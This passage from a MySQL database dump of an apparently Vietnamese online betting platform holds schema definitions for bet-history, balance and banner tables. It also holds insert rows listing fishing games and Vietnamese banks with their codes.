(156, 'runlight_animalpark_syncres', 'Animal Park Synchronize', 'singleplayer_games', 'runlight', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_nrBPtF6R0btNepLQyppjreYnAzL85Mnl6Rly0EDwdky1sxsRM3NYB8bCetFhTQnzTIxBZB45oCI7veTjW4xEdA==.jpeg', 'Animal Park Synchronize', 0, 0),
(157, 'runlight_sportcar_syncres', 'Sport Car Synchronize', 'singleplayer_games', 'runlight', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_3VAAWCmpbSoEJ2LAnGgosdEqPnEaj4gUWey5ZCtJ4ugkaM9Ks8890U7vfD70QH1dlA5vmwFAMaUsmLofYcsNbg==.jpeg', 'Sport Car Synchronize', 0, 0),
(158, 'fishing_haiwang2_multiplayer', 'Haiwang 3', 'singleplayer_games', 'fishing', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_gdSEWS0V7j8BP4Rd2boAafLUGYErTs3aE3wMFNvW14yUCAcVtK9EZxf3z1JjuXR2Q70OQAgzgyq4mZoikaYW7A==.jpeg', 'Haiwang 3', 0, 0),
(159, 'fishing_dashennaohai_multiplayer', 'Da Shen Nao Hai', 'singleplayer_games', 'fishing', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_DSsSoHjxOXupVIy63EYdlH5S5Te1XPWjeYdAeAgEntCJO7ucysOPqpjCmndMalaWX3N8Jt0qdsLg47Xu7h5rpw==.jpeg', 'Da Shen Nao Hai', 0, 0),
(160, 'fishing_moneytree_multiplayer', 'Money Tree', 'singleplayer_games', 'fishing', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_x8GsBDO5D7qD4BdWmNUjLnx92pokHmFs0zEoyzEChybfjAJtw9TVfhxZOfnE5iIlZ76dbnMRPT4KQZmSuGrLPQ==.jpeg', 'Money Tree', 0, 0),
(161, 'fishing_likuifishing_multiplayer', 'Likui Fishing', 'singleplayer_games', 'fishing', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_4UoPziYEhbU5Y52KOcrvJy1Rg8ckOqG8QJOilNcfPHdchpYRHnp8IxiFovEMI9YA8HwltEFCTxaYdjkf55OkAg==.jpeg', 'Likui Fishing', 0, 0),
(162, 'fishing_goldentoad_multiplayer', 'Golden Toad Fishing', 'singleplayer_games', 'fishing', '1', '0', 'https://media.eggsbook.com/mini-game/fish-farming.png', 'Fish hunter', 1, 1),
(163, 'fishing_monsterawaken_multiplayer', 'Hunter Monster Awaken', 'singleplayer_games', 'fishing', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_82srct8LTKeo1dgfOag1MbeskfAIxmocDpgo38QYkeRCj3IWfTP0FX4iCsfCGkM2IYUIduG0sQfASwmyVmAZcQ==.jpeg', 'Hunter Monster Awaken', 0, 0),
(164, 'fishing_haiba_multiplayer', 'Hai Ba', 'singleplayer_games', 'fishing', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_60J4pKMVwgx4Ht2mWjmOKHjmwR0DzKTt53czHQsqMqueULouiJE5MYpfWYXt69T8EmrxvmVu0jY2BKEeXU3RdA==.jpeg', 'Hai Ba', 0, 0),
(165, 'fishing_spongebob_multiplayer', 'Sponge Bob', 'singleplayer_games', 'fishing', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_JDCEKLXYYowr4RtFsh2b5Giho5aSR2qKIs9O6CiXF14PXZTjctYLyQiOcTiHLacrDgj1OdRAN9xZtYqCJXbq8Q==.jpeg', 'Sponge Bob', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `balancevoucherconfirm`
--

DROP TABLE IF EXISTS `balancevoucherconfirm`;
CREATE TABLE IF NOT EXISTS `balancevoucherconfirm` (
  `User_ID` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `Balance` decimal(18,8) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `balance_game`
--

DROP TABLE IF EXISTS `balance_game`;
CREATE TABLE IF NOT EXISTS `balance_game` (
  `id` int(11) NOT NULL,
  `user_id` varchar(25) NOT NULL,
  `balance` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `sales_user` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `datetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `bank`
--

DROP TABLE IF EXISTS `bank`;
CREATE TABLE IF NOT EXISTS `bank` (
  `bank_id` int(11) NOT NULL,
  `bank_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `bank_code` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `bank_status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `bank`
--

INSERT INTO `bank` (`bank_id`, `bank_name`, `bank_code`, `bank_status`) VALUES
(1, 'TECHCOMBANK (TCB)', 'TCB', 1),
(2, 'DBS - CHI NHANH THANH PHO HO CHI MINH', 'DBS', -1),
(3, 'NGAN HANG CONG NGHIEP HAN QUOC', 'IBK', -1),
(4, 'NGAN HANG CONG NGHIEP HAN QUOC CHI NHANH HCM (IBK HCM)', 'IBKHCM', -1),
(5, 'NGAN HANG KOOKMIN - CN HA NOI', 'KOOKMI', -1),
(6, 'NGAN HANG LIEN DOANH VIET - NGA (VRB)', 'VRB', -1),
(7, 'NGAN HANG NN VA PTNT VIETNAM (AGRIBANK)', 'AGB', -1),
(8, 'NGAN HANG NONGHYUP CHI NHANH HA NOI (NHB HN)', 'NHBHN', -1),
(9, 'NGAN HANG TMCP A CHAU (ACB)', 'ACB', 1),
(10, 'NGAN HANG TMCP AN BINH (ABBANK)', 'ABB', -1),
(11, 'NGAN HANG TMCP BAC A (NASB)', 'NASB', -1),
(12, 'NGAN HANG TMCP BAN VIET (VIETCAPITAL BANK)', 'VCPB', -1),
(13, 'NGAN HANG TMCP BAO VIET (BVB)', 'BVB', -1),
(14, 'NGAN HANG TMCP BUU DIEN LIEN VIET (LPB)', 'LPB', -1),
(15, 'NGAN HANG TMCP CONG THUONG VIET NAM (VIETINBANK)', 'VTB', -1),
(16, 'NGAN HANG TMCP DAI CHUNG VIET NAM (PVCOMBANK)', 'PVCB', -1),
(17, 'NGAN HANG TMCP DAI DUONG (OCEANBANK)', 'OJB', -1),
(18, 'NGAN HANG TMCP DAU KHI TOAN CAU (GPB)', 'GPB', -1),
(19, 'NGAN HANG TMCP DAU TU VA PHAT TRIEN VIET NAM (BIDV)', 'BIDV', 1),
(20, 'NGAN HANG TMCP DONG A (DONGABANK)', 'DAB', -1),
(21, 'NGAN HANG TMCP DONG NAM A (SEABANK)', 'SEAB', -1),
(22, 'NGAN HANG TMCP HANG HAI VIET NAM (MSB)', 'MSB', 1),
(23, 'NGAN HANG TMCP KIEN LONG (KIENLONGBANK)', 'KLB', -1),
(24, 'NGAN HANG TMCP NAM A (NAMABANK)', 'NAMABA', -1),
(25, 'NGAN HANG TMCP NGOAI THUONG VIET NAM (VIETCOMBANK)', 'VCB', 1),
(26, 'NGAN HANG TMCP PHAT TRIEN TP.HCM (HDB)', 'HDB', -1),
(27, 'NGAN HANG TMCP PHUONG DONG (OCB)', 'OCB', -1),
(28, 'NGAN HANG TMCP PT NHA DONG BANG SONG CUU LONG', 'MHB', -1),
(29, 'NGAN HANG TMCP QUAN DOI (MB)', 'MB', 1),
(30, 'NGAN HANG TMCP QUOC DAN (NCB)', 'NCB', -1),
(31, 'NGAN HANG TMCP QUOC TE VIB', 'VIB', -1),
(32, 'NGAN HANG TMCP SAI GON (SCB)', 'SCB', -1),
(33, 'NGAN HANG TMCP SAI GON - HA NOI (SHB)', 'SHB', -1),
(34, 'NGAN HANG TMCP SAI GON CONG THUONG (SAIGONBANK)', 'SGN', -1),
(35, 'NGAN HANG TMCP SAI GON THUONG TIN (SACOMBANK)', 'SACB', -1),
(36, 'NGAN HANG TMCP TIEN PHONG (TPBANK)', 'TPB', -1),
(37, 'NGAN HANG TMCP VIET A (VAB)', 'VAB', -1),
(38, 'NGAN HANG TMCP VIET NAM THINH VUONG (VPBANK)', 'VPB', -1),
(39, 'NGAN HANG TMCP VIET NAM THUONG TIN (VIETBANK)', 'VB', -1),
(40, 'NGAN HANG TMCP XANG DAU PETROLIMEX (PG BANK)', 'PGB', -1),
(41, 'NGAN HANG TMCP XUAT NHAP KHAU VIET NAM (EXIMBANK)', 'EIB', -1),
(42, 'NGAN HANG TNHH INDOVINA', 'IVB', -1),
(43, 'NGAN HANG TNHH MTV CIMB (CIMB)', 'CIMB', -1),
(44, 'NGAN HANG TNHH MTV HONGLEONG VIET NAM', 'HLB', -1),
(45, 'NGAN HANG TNHH MTV HSBC (VIET NAM)', 'HSBC', -1),
(46, 'NGAN HANG TNHH MTV PUBLIC VIET NAM (PBVN)', 'VID', -1),
(47, 'NGAN HANG TNHH MTV SHINHAN VIET NAM (SHBVN)', 'SHBVN', -1),
(48, 'NGAN HANG TNHH MTV STANDARD CHARTERED VIETNAM (SCVN)', 'SCVN', -1),
(49, 'NGAN HANG TNHH MTV UNITED OVERSEAS BANK (UOB)', 'UOB', -1),
(50, 'NGAN HANG WOORIBANK', 'WOO', -1),
(51, 'TM TNHH MTV Xay dung Viet Nam (CBBank)', 'CBBANK', -1);

-- --------------------------------------------------------

--
-- Table structure for table `banner`
--

DROP TABLE IF EXISTS `banner`;
CREATE TABLE IF NOT EXISTS `banner` (
  `banner_id` int(11) NOT NULL,
  `banner_img` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_ae_sexy`
--

DROP TABLE IF EXISTS `bet_history_ae_sexy`;
CREATE TABLE IF NOT EXISTS `bet_history_ae_sexy` (
  `id` int(11) NOT NULL,
  `gameType` varchar(10) DEFAULT NULL,
  `winAmount` decimal(18,4) DEFAULT NULL,
  `settleStatus` int(10) DEFAULT NULL,
  `realBetAmount` decimal(18,4) DEFAULT NULL,
  `realWinAmount` decimal(18,4) DEFAULT NULL,
  `txTime` varchar(50) DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `time123bet` datetime DEFAULT NULL,
  `userId` varchar(20) DEFAULT NULL,
  `betType` varchar(50) DEFAULT NULL,
  `platform` varchar(20) DEFAULT NULL,
  `txStatus` int(50) DEFAULT NULL,
  `betAmount` decimal(18,4) DEFAULT NULL,
  `gameName` varchar(50) DEFAULT NULL,
  `platformTxId` varchar(50) DEFAULT NULL,
  `betTime` varchar(50) DEFAULT NULL,
  `gameCode` varchar(50) DEFAULT NULL,
  `currency` varchar(4) DEFAULT NULL,
  `jackpotBetAmount` decimal(18,4) DEFAULT NULL,
  `jackpotWinAmount` decimal(18,4) DEFAULT NULL,
  `turnover` decimal(18,4) DEFAULT NULL,
  `roundId` varchar(50) DEFAULT NULL,
  `gameInfo` varchar(255) DEFAULT NULL,
  `statistical` int(10) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_agin`
--

DROP TABLE IF EXISTS `bet_history_agin`;
CREATE TABLE IF NOT EXISTS `bet_history_agin` (
  `id` int(11) NOT NULL,
  `statistical` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `billno` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `productid` varchar(10) DEFAULT NULL,
  `billtime` datetime DEFAULT NULL COMMENT 'GMT -4',
  `currency` varchar(10) DEFAULT NULL,
  `gametype` varchar(10) DEFAULT NULL,
  `betIP` varchar(50) DEFAULT NULL,
  `account` decimal(18,8) DEFAULT NULL,
  `cus_account` decimal(18,8) DEFAULT NULL,
  `valid_account` decimal(18,8) DEFAULT NULL,
  `flag` int(11) DEFAULT NULL COMMENT '0 = chưa hoàn thành, 1 = hoàn thành, 2 = đang chờ xử lý, 4 = đã bán, -8 = hủy',
  `platformtype` varchar(10) DEFAULT NULL,
  `odds` varchar(150) DEFAULT NULL,
  `sport` varchar(150) DEFAULT NULL,
  `category` varchar(150) DEFAULT NULL,
  `extbillno` varchar(150) DEFAULT NULL,
  `thirdbillno` varchar(150) DEFAULT NULL,
  `bettype` int(11) DEFAULT NULL,
  `system` int(11) DEFAULT NULL,
  `live` int(11) DEFAULT NULL,
  `current_score` varchar(150) DEFAULT NULL,
  `time_123betnow` datetime DEFAULT NULL COMMENT 'GMT 0',
  `reckontime` varchar(255) DEFAULT NULL,
  `competition` text,
  `market` text,
  `selection` text,
  `simplified_result` text,
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Lịch sử bet spost book';

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_agin_hunterfish`
--

DROP TABLE IF EXISTS `bet_history_agin_hunterfish`;
CREATE TABLE IF NOT EXISTS `bet_history_agin_hunterfish` (
  `id` int(11) NOT NULL,
  `statistical` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `productid` varchar(10) NOT NULL,
  `roomid` varchar(100) NOT NULL,
  `betx` decimal(18,8) NOT NULL,
  `sceneid` varchar(100) NOT NULL,
  `starttime` bigint(20) NOT NULL,
  `endtime` bigint(20) NOT NULL,
  `billtime` int(11) NOT NULL,
  `gametype` varchar(20) NOT NULL,
  `currency` varchar(5) NOT NULL,
  `totalbulletcost` decimal(18,8) NOT NULL,
  `totalfishcost` decimal(18,8) NOT NULL,
  `profit` decimal(18,8) NOT NULL,
  `totaljpcontribute` decimal(18,8) NOT NULL,
  `totaljackpot` decimal(18,8) NOT NULL,
  `totalfirstprize` decimal(18,8) NOT NULL,
  `remark` text,
  `devicetype` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `totalweaponHit` int(11) NOT NULL,
  `totalcollection` int(11) NOT NULL,
  `time_123betnow` datetime NOT NULL,
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_agin_slot`
--

DROP TABLE IF EXISTS `bet_history_agin_slot`;
CREATE TABLE IF NOT EXISTS `bet_history_agin_slot` (
  `id` int(11) NOT NULL,
  `statistical` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `billno` varchar(100) NOT NULL,
  `productid` varchar(10) NOT NULL,
  `billtime` datetime NOT NULL COMMENT 'GMT -4',
  `reckontime` datetime NOT NULL,
  `slottype` varchar(50) NOT NULL,
  `currency` varchar(10) NOT NULL,
  `gametype` varchar(10) NOT NULL,
  `betIP` varchar(50) NOT NULL,
  `account` decimal(18,8) NOT NULL COMMENT 'số tiền đặt cược',
  `cus_account` decimal(18,8) NOT NULL COMMENT 'số tiền thanh toán',
  `valid_account` decimal(18,8) NOT NULL,
  `account_base` decimal(18,8) NOT NULL COMMENT 'số tiền đặt cược bình thường. Bao gồm số tiền đặt cược JACKPOT nếu trò chơi có\r\nJACKPOT',
  `account_bonus` decimal(18,8) NOT NULL COMMENT 'số tiền đặt cược thưởng',
  `cus_account_base` decimal(18,8) NOT NULL COMMENT 'số tiền thanh toán bình thường',
  `cus_account_bonus` decimal(18,8) NOT NULL COMMENT 'số tiền trả thưởng',
  `src_amount` decimal(18,8) NOT NULL COMMENT 'số tiền ban đầu, trả về trống nếu loại trò chơi không hỗ trợ giá trị này',
  `dst_amount` decimal(18,8) NOT NULL COMMENT 'số tiền được cập nhật, trả về trống nếu loại trò chơi không hỗ trợ giá trị này',
  `flag` int(11) NOT NULL COMMENT '0 = bất thường (vui lòng liên hệ với dịch vụ khách hàng), 1 = hoàn thành, -8 = hủy\r\nHóa đơn của vòng cụ thể, -9 = hủy Số hóa đơn cụ thể',
  `platformtype` varchar(10) NOT NULL,
  `devicetype` int(11) NOT NULL COMMENT 'Loại thiết bị, 0 = PC, 1 = Di động',
  `exttxid` varchar(150) NOT NULL,
  `mainbillno` varchar(100) NOT NULL,
  `time_123betnow` datetime NOT NULL,
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_evo`
--

DROP TABLE IF EXISTS `bet_history_evo`;
CREATE TABLE IF NOT EXISTS `bet_history_evo` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `user_id` int(11) NOT NULL,
  `game_name` varchar(50) DEFAULT NULL,
  `suboper` varchar(50) DEFAULT NULL,
  `betmoney` double DEFAULT NULL,
  `awardmoney` double DEFAULT NULL,
  `roundid` bigint(20) DEFAULT NULL,
  `orderid` text,
  `betresult` varchar(50) DEFAULT NULL,
  `bettime` text,
  `timestring` bigint(20) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Statistical` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_evolution`
--

DROP TABLE IF EXISTS `bet_history_evolution`;
CREATE TABLE IF NOT EXISTS `bet_history_evolution` (
  `id` int(11) NOT NULL,
  `evo_id` varchar(100) NOT NULL,
  `evo_agent` varchar(10) NOT NULL,
  `evo_username` varchar(15) NOT NULL,
  `userId` int(11) NOT NULL,
  `evo_currency` varchar(5) NOT NULL,
  `evo_game` varchar(255) NOT NULL,
  `evo_game_id` varchar(255) NOT NULL,
  `evo_betcode` varchar(255) NOT NULL,
  `evo_bet` decimal(18,8) NOT NULL,
  `evo_payout` decimal(18,8) NOT NULL,
  `evo_win` decimal(18,8) NOT NULL,
  `evo_datetime` datetime NOT NULL COMMENT 'UTC +0',
  `evo_status` varchar(20) NOT NULL,
  `evo_result` varchar(20) NOT NULL,
  `time_123betnow` datetime NOT NULL COMMENT '+0, +1',
  `statistical` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_sbobet`
--

DROP TABLE IF EXISTS `bet_history_sbobet`;
CREATE TABLE IF NOT EXISTS `bet_history_sbobet` (
  `id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL COMMENT 'match với User_Name_Sbobet trong bảng users',
  `user_id` int(11) NOT NULL,
  `sportsType` int(11) NOT NULL COMMENT '	Loại cược',
  `bet_winlost` int(11) NOT NULL COMMENT 'số tiền thắng hoặc thua',
  `stake` int(11) NOT NULL COMMENT 'Số tiền đặt cược',
  `amount_win` int(11) NOT NULL COMMENT 'Tổng số tiền thắng thua',
  `winLostDate` datetime NOT NULL COMMENT 'Thời gian để tính toán khoản đặt cược',
  `modifyDate` datetime NOT NULL COMMENT 'Lần cuối cùng trạng thái cược này đã được sửa đổi.',
  `currency` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `status` varchar(50) COLLATE utf8_unicode_ci NOT NULL COMMENT 'Trạng thái cược của Người chơi.\r\nrunning => ''Đang chờ'',\r\ndraw => ''Hòa'',\r\nwon => ''Thắng'',\r\nlose => ''Thua''',
  `refNo` int(11) NOT NULL COMMENT 'Số tham chiếu của hệ thống nhãn trắng.',
  `Portfolio` varchar(255) COLLATE utf8_unicode_ci NOT NULL COMMENT 'Thể loại Game',
  `ip` varchar(255) COLLATE utf8_unicode_ci NOT NULL COMMENT 'IP mà người chơi đã đặt cược',
  `betOption` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `marketType` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hdp` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `odds` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `league` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `match` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `liveScore` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `htScore` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `ftScore` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `orderTime` datetime NOT NULL,
  `maxWinWithoutActualStake` int(11) NOT NULL,
  `oddsStyle` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `actualStake` int(11) NOT NULL,
  `turnover` int(11) NOT NULL,
  `turnoverByStake` int(11) NOT NULL,
  `turnoverByActualStake` int(11) NOT NULL,
  `netTurnoverByStake` int(11) NOT NULL,
  `netTurnoverByActualStake` int(11) NOT NULL,
  `isLive` tinyint(1) NOT NULL DEFAULT '1',
  `topDownline` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'giờ betnow\r\n',
  `statistical_time123betnow` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical` tinyint(4) NOT NULL DEFAULT '0' COMMENT '0. chưa thống kê, 1. đã lưu thống kê'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_sbobet_casino`
--

DROP TABLE IF EXISTS `bet_history_sbobet_casino`;
CREATE TABLE IF NOT EXISTS `bet_history_sbobet_casino` (
  `id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `gameId` int(11) NOT NULL,
  `tableName` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `turnover` int(11) NOT NULL,
  `productType` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `orderTime` datetime NOT NULL,
  `modifyDate` datetime NOT NULL,
  `settleTime` datetime NOT NULL,
  `winLostDate` datetime NOT NULL,
  `refNo` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `currency` varchar(3) COLLATE utf8_unicode_ci NOT NULL,
  `stake` int(11) NOT NULL,
  `winLost` int(11) NOT NULL,
  `amount_win` int(11) NOT NULL,
  `status` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `topDownline` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Portfolio` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical_time123betnow` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical` tinyint(4) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_sbobet_ib`
--

DROP TABLE IF EXISTS `bet_history_sbobet_ib`;
CREATE TABLE IF NOT EXISTS `bet_history_sbobet_ib` (
  `id` int(11) NOT NULL,
  `username` varchar(25) NOT NULL,
  `userId` int(11) NOT NULL,
  `turnover_by_stake` decimal(18,8) NOT NULL,
  `net_turnover_by_stake` decimal(18,8) NOT NULL,
  `turnover_by_actual_stake` decimal(18,8) NOT NULL,
  `net_turnover_by_actual_stake` decimal(18,8) NOT NULL,
  `currency` varchar(10) NOT NULL,
  `number_of_bets` decimal(18,8) NOT NULL,
  `member_wins` decimal(18,8) NOT NULL,
  `company` decimal(18,8) NOT NULL,
  `sgd_company` decimal(18,8) NOT NULL,
  `time_123betnow` datetime NOT NULL,
  `statistical` int(11) NOT NULL,
  `date` date DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_sbobet_seamless`
--

DROP TABLE IF EXISTS `bet_history_sbobet_seamless`;
CREATE TABLE IF NOT EXISTS `bet_history_sbobet_seamless` (
  `id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `gameType` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `gameRoundId` int(11) NOT NULL,
  `gamePeriodId` int(11) NOT NULL,
  `winLost` int(11) NOT NULL,
  `stake` int(11) NOT NULL COMMENT 'Số tiền đặt cược',
  `amount_win` int(11) NOT NULL,
  `turnoverStake` int(11) NOT NULL,
  `orderDetail` text COLLATE utf8_unicode_ci NOT NULL,
  `gameResult` text COLLATE utf8_unicode_ci,
  `gameId` int(11) NOT NULL,
  `gpId` int(11) NOT NULL,
  `orderTime` datetime NOT NULL,
  `modifyDate` datetime NOT NULL,
  `settleTime` datetime NOT NULL,
  `winLostDate` datetime NOT NULL,
  `refNo` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `currency` varchar(3) COLLATE utf8_unicode_ci NOT NULL,
  `status` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `topDownline` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Portfolio` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical_time123betnow` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical` tinyint(4) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_sbobet_thirdpartysportsbook`
--

DROP TABLE IF EXISTS `bet_history_sbobet_thirdpartysportsbook`;
CREATE TABLE IF NOT EXISTS `bet_history_sbobet_thirdpartysportsbook` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL COMMENT 'match với User_Name_Sbobet trong bảng users',
  `user_id` int(11) NOT NULL,
  `gamePeriodId` int(11) NOT NULL,
  `gameRoundId` int(11) NOT NULL,
  `gameType` varchar(255) NOT NULL,
  `turnoverStake` varchar(50) NOT NULL,
  `orderDetail` text NOT NULL,
  `gameResult` text NOT NULL,
  `gameId` int(11) NOT NULL,
  `gpId` int(11) NOT NULL,
  `orderTime` datetime NOT NULL,
  `modifyDate` datetime NOT NULL,
  `settleTime` datetime NOT NULL,
  `winLostDate` datetime NOT NULL COMMENT 'Thời gian để tính toán khoản đặt cược',
  `refNo` varchar(255) NOT NULL,
  `currency` varchar(3) NOT NULL,
  `stake` int(11) NOT NULL COMMENT 'Số tiền đặt cược',
  `winLost` int(11) NOT NULL COMMENT 'số tiền thắng hoặc thua',
  `amount_win` int(11) NOT NULL COMMENT 'Tổng số tiền thắng thua',
  `status` varchar(50) NOT NULL COMMENT '	Trạng thái cược của Người chơi.',
  `topDownline` varchar(255) DEFAULT NULL,
  `Portfolio` varchar(255) NOT NULL COMMENT 'Thể loại Game',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical_time123betnow` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical` tinyint(4) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_sbobet_virtualsport`
--

DROP TABLE IF EXISTS `bet_history_sbobet_virtualsport`;
CREATE TABLE IF NOT EXISTS `bet_history_sbobet_virtualsport` (
  `id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `gameId` int(11) NOT NULL,
  `odds` int(11) NOT NULL,
  `oddsStyle` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `actualStake` int(11) NOT NULL,
  `turnover` int(11) NOT NULL,
  `productType` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `orderTime` datetime NOT NULL,
  `modifyDate` datetime NOT NULL,
  `settleTime` datetime NOT NULL,
  `winLostDate` datetime NOT NULL,
  `refNo` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `currency` varchar(3) COLLATE utf8_unicode_ci NOT NULL,
  `stake` int(11) NOT NULL COMMENT 'Số tiền đặt cược',
  `winLost` int(11) NOT NULL,
  `amount_win` int(11) NOT NULL COMMENT 'Tổng số tiền thắng thua',
  `status` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `topDownline` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `htScore` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `ftScore` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `betOption` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `marketType` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hdp` int(11) NOT NULL,
  `match` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Portfolio` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical_time123betnow` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `statistical` tinyint(4) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `bet_history_wm`
--

DROP TABLE IF EXISTS `bet_history_wm`;
CREATE TABLE IF NOT EXISTS `bet_history_wm` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `game_type` varchar(50) NOT NULL,
